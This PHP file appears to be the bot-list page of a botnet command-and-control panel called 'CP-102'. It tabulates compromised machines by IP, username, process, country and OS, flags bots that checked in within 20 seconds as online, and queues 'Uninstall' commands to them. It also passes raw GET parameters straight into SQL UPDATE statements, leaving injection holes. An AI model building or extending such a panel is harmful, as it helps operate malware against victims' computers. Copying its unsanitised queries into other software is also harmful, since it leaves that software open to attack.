<?php
require 'db.php';
include ('db.php');

include 'include/geo/geoip.inc';
$gi = geoip_open("include/geo/GeoIP.dat", "");

ob_end_clean();
ob_start();


$bootstrapalert = "";
// Bot list replace var
$newbotslistre = '';
$alternate = 1;
$totalbotsindb = 0;
$newbotslistempleft = '<tr>
<td colspan="1" align="center" class="td_c3">#id_row</td>
<td colspan="1" align="center" class="td_c3" id="bot_id"><a href="details.php?bot_id=#bot_id_row" class="botid"><b>#bot_id_row</b></a></td>
<td colspan="1" align="center" class="td_c3">#ipv4_row</td>
<td colspan="1" align="center" class="td_c3" >#username_row</td>
<td colspan="1" align="center" class="td_c3">#procname_row</td>
<td colspan="1" align="left" class="td_c3"><div class="boxflag">#country_row</div></td>
<td colspan="1" align="center" class="td_c3">#osver_row</td>
<td colspan="1" align="center" class="td_c3">#lastactivity_row</td>
#status_row</td>
</tr>
';



$expire = 365*24*3600;
ini_set('session.gc_maxlifetime', $expire);
session_start();

// Check if user is logged in using the session variable
if(empty($_SESSION["logged_in"])){
    if(empty($_SESSION["user"])){
        header("location: error.php");
    }else{
        setcookie(session_name(),session_id(),0);
        // Makes it easier to read
        $user = $_SESSION['user'];
        $active = $_SESSION['active'];
        }
}
else
{
    setcookie(session_name(),session_id(),time()+$expire);
    // Makes it easier to read
    $user = $_SESSION['user'];
    $active = $_SESSION['active'];
}

// Format Bytes
function convertToReadableSize($size){
  $base = log($size) / log(1024);
  $suffix = array(" B", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

if($_GET && isset($_GET['csv'])){

    $id = $_GET['csv'];

$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> Database exported ... Redirecting ...
</div>
btalert;

header( "refresh:3; url=list.php" );         

}

// Bots Query
if ($bots_new = $mysqli->query("SELECT * FROM bots"))
        {
                if($bots_new->num_rows === 0){
                   
                }else{
                        while ($row = $bots_new->fetch_assoc()) {

                            $totalbotsindb = $bots_new->num_rows;

                            //Bot ID
                            $newbotslistre .= str_replace("#bot_id_row", $row['bot_id'], $newbotslistempleft);
                            //ID
                            $newbotslistre = str_replace("#id_row", $row['id'], $newbotslistre);
                            //IPV4
                            $newbotslistre = str_replace("#ipv4_row", $row['ipv4'], $newbotslistre);
                            //Username
                            $newbotslistre = str_replace("#username_row", $row['username'], $newbotslistre);
                            //Process
                            $newbotslistre = str_replace("#procname_row", $row['process_name'], $newbotslistre);
                            //Country
                            $countrytorep = strtolower(geoip_country_code_by_id($gi, $row['country']));
                            $countrytoname = geoip_country_name_by_id($gi, $row['country']);

                            if ($countrytorep === ""){
                                $countryrow ='<img src="./images/flags/--.png" width="16px" height="10px" style="margin-right:5px"> ';
                                $countryrow .= "Unknown" ;
                            }else{
                                $countryrow ='<img src="./images/flags/'.$countrytorep.'.png" width="16px" height="10px" style="margin-right:5px"> ';
                                $countryrow .= $countrytoname ;
                            }
                            $newbotslistre = str_replace("#country_row", $countryrow , $newbotslistre);
							//Os
                            $newbotslistre = str_replace("#osver_row", $row['os_version'], $newbotslistre);
                            //Last Activity
                            $lastactivity = str_replace("_"," ",$row['last_activity']);
							$newbotslistre = str_replace("#lastactivity_row",$lastactivity , $newbotslistre);
                            //Online Time
                            // If bot connected in last 10 seconds means it's online
                            $now_sub = time();
                            $last_sub = strtotime($lastactivity);
                            //echo $now_sub." ".$last_sub."<br>";
                            $fin_sub = $now_sub - $last_sub;
							$isonline = 0;
                            if ($fin_sub <= 20) {
                                $newbotslistre = str_replace("#status_row",'<td colspan="1" align="center" class="online">Online', $newbotslistre);
								$isonline = 1;
                            }else{
                                $newbotslistre = str_replace("#status_row",'<td colspan="1" align="center" class="offline">Offline', $newbotslistre);
								$isonline = 0;
                            }

							
                            if($alternate == 1){
                                $newbotslistre = str_replace("%alt%", 1, $newbotslistre);
                                $alternate = 2;
                            }else{
                                $newbotslistre = str_replace("%alt%", 2, $newbotslistre);
                                $alternate = 1;
                            }
                        }
                    }
        

            
}else{
	die($mysqli->error);
}

if($_GET && isset($_GET['read'])){

    $showbts = $_GET['read'];
    $sql = "UPDATE accounts SET showbots='$showbts' WHERE user='$user';";
        if ($mysqli->query($sql) === TRUE) {
                
$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> Bot notify set to $showbts. Redirecting ...
</div>
btalert;
header( "refresh:3; url=list.php" );         
}else{
    die($mysqli->error);
}
}


if($_GET && isset($_GET['del'],$_GET['id'])){

    $idremoved = $_GET['id'];
    $sql = "UPDATE bots SET cmd='Uninstall' WHERE bot_id='$idremoved';";
        if ($mysqli->query($sql) === TRUE) {
                
$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> bot $idremoved uninstalled. Redirecting ...
</div>
btalert;
header( "refresh:3; url=list.php" );         
}else{
    die($mysqli->error);
}
}


$sql = "SELECT lastactivity,showbots FROM accounts WHERE user = '$user'";
$result = $mysqli->query($sql);
if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
        $lastactivity = $row['lastactivity'];
        $showbots = $row['showbots'];
	}
} else {
    die($mysqli->error);
}

if ($showbots === "True"){
    $showbotsnotify = '<span class="label label-info">+'.$totalbotsindb.'</span>';
}else{
    $showbotsnotify = "";
}

// Page
$variable = <<<Bdy
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>Client List</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="lib/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.css">

    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />

    
    <script src="lib/jquery-1.11.1.min.js" type="text/javascript"></script>
    <script>
    function sortTable(n) {
      var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
      table = document.getElementById("myTable");
      switching = true;
      //Set the sorting direction to ascending:
      dir = "asc"; 
      /*Make a loop that will continue until
      no switching has been done:*/
      while (switching) {
        //start by saying: no switching is done:
        switching = false;
        rows = table.getElementsByTagName("TR");
        /*Loop through all table rows (except the
        first, which contains table headers):*/
        for (i = 1; i < (rows.length - 1); i++) {
          //start by saying there should be no switching:
          shouldSwitch = false;
          /*Get the two elements you want to compare,
          one from current row and one from the next:*/
          x = rows[i].getElementsByTagName("TD")[n];
          y = rows[i + 1].getElementsByTagName("TD")[n];
          /*check if the two rows should switch place,
          based on the direction, asc or desc:*/
          if (dir == "asc") {
            if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch= true;
              break;
            }
          } else if (dir == "desc") {
            if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch = true;
              break;
            }
          }
        }
        if (shouldSwitch) {
          /*If a switch has been marked, make the switch
          and mark that a switch has been done:*/
          rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
          switching = true;
          //Each time a switch is done, increase this count by 1:
          switchcount ++;      
        } else {
          /*If no switching has been done AND the direction is "asc",
          set the direction to "desc" and run the while loop again.*/
          if (switchcount == 0 && dir == "asc") {
            dir = "desc";
            switching = true;
          }
        }
      }
    }
    </script>
        <script src="lib/jQuery-Knob/js/jquery.knob.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function() {
            $(".knob").knob();
        });
    </script>


    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">
    <script src="https://www.w3schools.com/lib/w3.js"></script>
</head>
<body class=" theme-blue">

    <script type="text/javascript">
        $(function() {
            var match = document.cookie.match(new RegExp('color=([^;]+)'));
            if(match) var color = match[1];
            if(color) {
                $('body').removeClass(function (index, css) {
                    return (css.match (/\btheme-\S+/g) || []).join(' ')
                })
                $('body').addClass('theme-' + color);
            }

            $('[data-popover="true"]').popover({html: true});
            
        });
    </script>
    <style type="text/css">
        #line-chart {
            height:300px;
            width:800px;
            margin: 0px auto;
            margin-top: 1em;
        }
        .navbar-default .navbar-brand, .navbar-default .navbar-brand:hover { 
            color: #fff;
        }
    </style>

    <script type="text/javascript">
        $(function() {
            var uls = $('.sidebar-nav > ul > *').clone();
            uls.addClass('visible-xs');
            $('#main-menu').append(uls.clone());
        });
    </script>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="../assets/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/ico/apple-touch-icon-57-precomposed.png">
  

  <!--[if lt IE 7 ]> <body class="ie ie6"> <![endif]-->
  <!--[if IE 7 ]> <body class="ie ie7 "> <![endif]-->
  <!--[if IE 8 ]> <body class="ie ie8 "> <![endif]-->
  <!--[if IE 9 ]> <body class="ie ie9 "> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> 
   
  <!--<![endif]-->

    <div class="navbar navbar-default" role="navigation">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="" href="cp.php"><span class="navbar-brand">CP-102</span></a></div>

        <div class="navbar-collapse collapse" style="height: 1px;">
          <ul id="main-menu" class="nav navbar-nav navbar-right">
            <li class="dropdown hidden-xs">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <span class="glyphicon glyphicon-user padding-right-small" style="position:relative;top: 3px;"></span> $user
                    <i class="fa fa-caret-down"></i>
                </a>

              <ul class="dropdown-menu">
                <li><a href="myaccount.php">My Account</a></li>
                <li class="divider"></li>
                <li class="dropdown-header">Control Panel</li>
                <li><a href="users.php">Users</a></li>
                <li class="divider"></li>
                <li><a tabindex="-1" href="logout.php">Logout</a></li>
              </ul>
            </li>
          </ul>

        </div>
      </div>
    </div>
    

    <div class="sidebar-nav">
    <ul>
    <li><a href="#" data-target=".dashboard-menu" class="nav-header" data-toggle="collapse"><i class="fa fa-fw fa-dashboard"></i> Dashboard$showbotsnotify<i class="fa fa-collapse"></i></a></li>
    <li><ul class="dashboard-menu nav nav-list collapse in">
            <li><a href="cp.php"><span class="fa fa-caret-right"></span> Main</a></li>
            <li class="active"><a href="list.php" ><span class="fa fa-caret-right"></span> Bots</a></li>
            <li ><a href="task.php"><span class="fa fa-caret-right"></span> Tasks</a></li>
            <li ><a href="users.php"><span class="fa fa-caret-right"></span> User List</a></li>
    </ul></li>
    <ul>
    <li><a href="#" data-target=".legal-menu" class="nav-header collapsed" data-toggle="collapse"><i class="fa fa-fw fa-cog"></i> Settings<i class="fa fa-collapse"></i></a></li>
    <li><ul class="legal-menu nav nav-list collapse">
        <li ><a href="set.php"><span class="fa fa-caret-right"></span> Optimization</a></li>
        <li ><a href="logs.php"><span class="fa fa-caret-right"></span> System Logs</a></li>
</ul></li>
    </div>

    <div class="content">
        <div class="header">
            <div class="stats">

</div>

            <h1 class="page-title">Bots</h1>
                    

        </div>
        <div class="main-content">
            <script>
            function check_all() {
                var checkboxes = document.getElementsByName('check');
                checkboxes = [...checkboxes];
                for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = true
                }
              }
              function un_check_all() {
                var checkboxes = document.getElementsByName('check');
                checkboxes = [...checkboxes];
                for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = false;
                }
              }
            </script>

                $bootstrapalert


                <button onclick="location.href='list.php?read=False';" class="btn btn-default">Mark All As Read</button>
                <button onclick="location.href='list.php?read=True';" class="btn btn-default">Mark All As Not Read</button>
                <a href="dump.php?all=true" target="_blank" style="float:right">Export Database (CSV)</a>
            
            <div style="margin-top:10px">
            <table id="botlist" class="table table-condensed table-hover table-striped table-bordered">
                <thead>
                    <tr>
                        <th class="point" onclick="sortTable(0)">#</th>
                        <th class="point" onclick="sortTable(1)">Bot ID</th>
                        <th class="point" onclick="sortTable(2)">IP Address</th>
                        <th class="point" onclick="sortTable(3)">Username</th>
                        <th class="point" onclick="sortTable(4)">Process Name</th>
                        <th class="point" onclick="sortTable(5)">Country</th>
                        <th class="point" onclick="sortTable(6)">OS</th>   
                        <th class="point" onclick="sortTable(7)">Last Activity</th>
                        <th class="point" onclick="sortTable(8)">Status</th>
                    </tr>
              </thead>
              <tbody>
                $newbotslistre
              </tbody>
            </table>
            </div>
            




    <script src="lib/bootstrap/js/bootstrap.js"></script>
    <script type="text/javascript">
        $("[rel=tooltip]").tooltip();
        $(function() {
            $('.demo-cancel-click').click(function(){return false;});
        });
    </script>
    
  
	<script src="js/plugins/datatables/jquery.dataTables.js" type="text/javascript"></script>
	<script src="js/plugins/datatables/dataTables.bootstrap.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$("#botlist").dataTable({
				"order": [[ 3, "desc" ]],
				"iDisplayLength": 50,
				"aLengthMenu": [[10, 25, 50, 100, -1], [10, 25, 50, 100, "All"]],
				"oLanguage": {
					"sEmptyTable": "No data to display"
				}
			});
		});
    </script>
    
</body></html>


</body>
</html>
Bdy;




echo $variable;  

    

?>